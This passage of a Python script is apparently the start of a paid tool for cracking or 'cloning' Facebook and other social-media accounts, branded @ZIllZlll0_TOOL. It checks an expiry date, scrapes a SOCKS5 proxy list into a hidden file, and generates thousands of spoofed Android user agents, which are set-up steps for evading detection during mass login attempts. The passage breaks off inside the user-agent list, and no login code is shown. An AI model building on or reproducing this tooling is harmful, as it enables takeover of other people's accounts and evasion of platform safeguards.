import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
now = datetime.datetime.today()

now = datetime.datetime.today()
mmmm = str(now.month)
dddd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t=(mmmm + "/" + dddd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)


hours = (now.hour)
x = datetime.datetime.now()
g= datetime.datetime(2023, 10, 9, 8, 0 ,0)

if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print('\n\n')
 print(x)
 
 sys.exit(0)
 

if (x.strftime("%x"))==(g.strftime("%x")):
   print('')
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print('\n\n')
    print(x)
    
    sys.exit(0)
   else:
    print('')  
else:
    print('')
print('')


os.system('clear')

print(f'\033[1;32m➣ \033[1;37m DATE : '+str(dddd)+'-'+str(mmmm)+'-'+str(yyyy)+'')
logo=("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠴⣾⢿⣯⣉⡙⢗⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡽⡽⠊⠉⠉⠺⣿⣆⢋⢵⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⢀⣾⣿⠟⠀⠀⠀⠀⠀⣟⠗⠠⣾⣇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣤⣴⣟⡿⠋⠀⠀⠀⠀⠀⢠⣟⡎⠩⢸⣻⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠀⠀⠀⢀⣀⡠⢶⣱⢚⡴⣵⣿⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⣖⣿⢿⢟⢛⡼⣛⣞⣵⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢺⣭⡗⢭⣀⣵⠋⠅⣡⡋⢸⠙⣿⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢴⢳⢻⢶⡔⡫⢍⣫⠴⣾⢣⡼⢃⣦⡨⢻⣆⠀⠀
⡠⡪⠍⢨⠷⢤⡤⢐⠤⠚⣫⣷⣿⡙⢃⡨⣚⢋⣧⣤⣾⣉⢴⣿⡟⠻⡿⠟⣢⣄
⠻⣄⡀⣀⣀⣠⡅⠃⡀⢀⠀⠐⠉⠉⠑⢲⣦⢷⠋⠒⢶⢶⣿⡋⠁⠈⠉⠈⠐⠛
⠀⠀⠙⠋⠉⢉⣿⢿⢿⡶⠾⣷⠽⣠⠁⣈⣿⣶⣷⣧⡔⣁⣠⣉⡄⠀⠀⠀⠀⠀
⠀⠀⣀⢀⡤⣾⢗⠕⠁⣐⠤⠉⡴⢂⡯⡻⠙⠉⠉⠸⠁⣀⣹⠟⠀⠀⠀⠀⠀⠀
⠀⣰⡓⠑⢯⣼⢲⣖⡫⣵⠧⠾⠾⠛⠋⠀⠀⠀⡠⠇⠸⡿⡗⣀⠀⠀⠀⠀⠀⠀
⠀⠘⠛⠋⠛⠂⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠘⠓⠺⣤⠛⢺⣿⠅⠀⠀⠀⠀⠀

'''

\33[1;32m
\33[1;33m
\33[1;34m
\33[1;35m
\33[1;31m
 [HOT-I4.2]
                 [Facebook><@ZIllZlll0_TOOL]
                 [TIKTOK><@ZIllZlll0_TOOL
                 [Crack><Pubg><Crack><TOOL]
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31m@ZIllZlll0_TOOL\33[38;5;196m━━━━━━━━━━━━━━━━━━━━
\x1b[1;32m{+} \x1b[1;91mTOOL @ZIllZlll0_TOOL  \x1b[1;97m:@ZIllZlll0_TOOL
\x1b[1;32m{+} \x1b[1;92m@ZIllZlll0_TOOL       \x1b[1;91m: \x1b[1;91m: NOT
\x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;92m@ZIllZlll0_TOOL    \x1b[1;97m : \x1b[1;93mFILE-CLONE/ \x1b[1;92mACTIVE
\x1b[1;36m{+} \x1b[1;90mTOOL VIRSION      \x1b[1;97m: \x1b[1;90m 4.2
\x1b[1;36m{+} \x1b[1;93m@ZIllZlll0 \x1b[1;97m: @ZIllZlll0_TOOL
\033[38;5;46m{+} \x1b[1;96m@ZIllZlll0_TOOL_HOT\33[38;5;196m: [★]PAID-𝗩4.2\33[38;5;196m 
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;92m@ZIllZlll0_TOOL\33[38;5;196m━━━━━━━━━━━━━━━━━━━━ 
""")
 #------------------[ KIller ]-------------------#
import os, platform, time, sys
time.sleep(5)
os.system('clear')
time.sleep(2)
print('@ZIllZlll0_TOOL_HOT')
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(2000):
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Xiaomi 10 Pro Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4000,5100)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['GMSCore 23.13.12)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4800,5900)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)  

    aa='Mozilla/5.0 (Linux; Android  '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['2203129G Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(2400,3500)
    k=random.randrange(200,350)
    l='Mobile Safari/837.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)  

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['22071212AG)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5500,6600)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)  
    
    aa='Mozilla/5.0 (Linux; '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['2211133G)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4600,5700)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['xiaomi 6 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(2700,3800)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['SKR-A0 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5000,6100)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['SKW-H0 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5100,6200)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['DLT-H0 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/4.0.2 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5700,6800)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['KLE-AO)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4300,5400)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['SHARK KLE-H0 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5400,6500)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['MBU-A0)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4300,5400)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['SHARK MBU-H0 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(3900,5000)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Black Shark 3S)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4400,5500)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['SHARK PRS-H0)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5500,6700)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
  
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Black Shark 4S)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(3900,5000)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['AWM-A0 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5700,6800)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['2013023 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(2300,3400)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)

    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['2014817 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(3900,5000)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['2014818 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(2900,4000)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Hongmi 4A) '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 7S Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4400,5500)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['HM NOTE 1TD Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(3300,4400)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
    
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Mi 10 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(4800,5900)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
   
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['M2007J17G Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(80,106)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(20,103)
    i='0'
    j=random.randrange(5200,6300)
    k=random.randrange(200,350)
    l='Mobile Safari/537.36 OPR/7.2.2254.146534'
    uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uakuh)
 
    aa='Mozilla/5.0 (Linux; Android '
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['M2007J3SG)'])
